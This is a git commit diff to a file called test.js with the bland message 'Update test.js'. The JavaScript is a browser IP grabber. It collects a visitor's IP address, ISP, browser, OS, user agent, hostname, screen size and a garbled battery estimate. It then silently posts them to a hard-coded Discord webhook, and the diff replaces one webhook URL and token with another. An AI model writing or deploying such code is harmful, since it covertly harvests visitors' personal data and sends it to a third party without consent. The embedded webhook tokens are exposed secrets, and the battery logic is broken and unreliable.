ea170cace564ddfc8e95492d94a7ec45cd320362
49rip <146723162+49rip@users.noreply.github.com>
2023-12-19 18:35:45 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,32 +1,31 @@
-
 let ip = "";
 let browser = window.navigator.userAgent;
 let os = window.navigator.platform;
 let userAgent = navigator.userAgent;
 let hostName = window.location.hostname;
 let isp = "";
-let batteryPercentage = 0;
+let screenWidth = window.innerWidth;
+let screenHeight = window.innerHeight;
+let batteryLevel = navigator.getBattery()?.charging ? navigator.getBattery()?.chargingTime : navigator.getBattery()?.dischargingTime || 0;
+batteryLevel = Math.round((batteryLevel || 0) / 3600 * 100); // Convert time to percentage
 
 fetch("https://api.ipify.org")
-  .then(response => response.text())
-  .then(data => {
+  .then(response => response.text()) 
+  .then(data => { 
     ip = data;
-    return fetch(`https://geoip-db.com/json/` + ip); 
+    return fetch(`https://ipapi.co/${ip}/json/`); 
   })
-  .then(response => response.json())
-  .then(data => {
-    const countryCode = data?.country_code || ""; 
-    return fetch("https://sysinfojs.org/sysinfo"); 
-  })
-  .then(response => response.json())
-  .then(data => {
-    batteryPercentage = data?.battery || 0; 
+  .then(response => response.json()) 
+  .then(data => { 
+    isp = data.org;
     
-    const body = { content: `Date/Time: ${timestamp}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}\nISP: ${isp}\nCountry Code: ${countryCode}\nBattery Percentage: ${batteryPercentage}` }; 
-    fetch("https://discord.com/api/webhooks/1183806794833870909/ZzS66DobbeePFtVe7OY_7T7GYH60sUZn4sclIlcig1nIls8BSWf2UNYvlcuDxR-P4gpI", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } }) // send the message to Discord webhook with the updated body object
-      .then(() => console.log("success")) // log a success message to console when the message is sent successfully
-      .catch(() => { // handle errors when sending message to Discord webhook (fallback)
-        const body = { content: `Date/Time: ${timestamp}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}` }; // remove the new variables from the fallback message body since they're not available in this case (optional)
-        fetch("https://discord.com/api/webhooks/1183806794833870909/ZzS66DobbeePFtVe7OY_7T7GYH60sUZn4sclIlcig1nIls8BSWf2UNYvlcuDxR-P4gpI", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } }) // send the fallback message to Discord webhook with updated body object (optional)
-          .then(() => console.log("success (fallback)")) 
+    const body = { content: `Date/Time: ${Date.now()}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}\nISP: ${isp}\nScreen Size: ${screenWidth} x ${screenHeight}\nDevice Battery (%): ${batteryLevel}` };
+    fetch("https://discord.com/api/webhooks/1161339513059160144/-9a91YW7mvzuxvbxDXg6NrqzNlkZwZjNsSym097_TDIr6G5qgHxUe4l9aAu_tJGO0vAc", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
+      .then(() => console.log("success")) 
+      .catch(() => { 
+        const body = { content: `Date/Time: ${Date.now()}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}` };
+        fetch("https://discord.com/api/webhooks/1161339513059160144/-9a91YW7mvzuxvbxDXg6NrqzNlkZwZjNsSym097_TDIr6G5qgHxUe4l9aAu_tJGO0vAc", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
+          .then(() => console.log("Success! (fallback)")) 
       }); 
+  });
+```
